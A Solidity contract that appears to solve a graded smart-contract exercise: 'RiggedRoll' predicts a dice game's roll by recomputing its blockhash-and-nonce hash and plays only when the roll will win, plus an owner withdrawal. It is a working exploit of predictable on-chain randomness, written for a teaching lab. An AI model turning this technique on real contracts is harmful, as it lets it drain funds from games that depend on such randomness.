pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

error RiggedRoll__NotWinningRoll();

contract RiggedRoll is Ownable {
	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	receive() external payable {}

	function riggedRoll() public {
		require(
			address(this).balance >= 0.002 ether,
			"Needs at least 0.002 ether"
		);
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
		);
		uint256 roll = uint256(hash) % 16;
		if (roll > 2) {
			revert RiggedRoll__NotWinningRoll();
		}
		diceGame.rollTheDice{ value: 0.002 ether }();
	}

	function withdraw(address _addr, uint256 _amount) public onlyOwner {
		payable(_addr).transfer(_amount);
	}
}
